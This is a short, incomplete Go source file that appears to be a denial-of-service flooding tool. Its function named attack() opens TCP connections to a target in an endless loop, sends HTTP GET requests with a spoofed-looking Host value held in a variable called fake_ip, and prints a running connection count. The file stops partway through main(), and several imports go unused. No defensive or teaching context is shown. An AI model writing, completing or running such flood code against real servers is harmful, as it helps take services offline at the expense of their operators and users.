package main

import (
    "fmt"
    "net"
    "os"
    "os/signal"
    "strings"
    "sync"
    "syscall"
    "time"
)

var (
    target string
    port string
    fake_ip string
    already_connected int
)

func attack() {
    for {
        s, _ := net.Dial("tcp", target)
        s.Write([]byte("GET /" + target + " HTTP/1.1\r\n"))
        s.Write([]byte("Host: " + fake_ip + "\r\n\r\n"))
        s.Close()

        already_connected++
        if already_connected % 500 == 0 {
            fmt.Println(already_connected)
        }
    }
}

func main() {
    target = ""
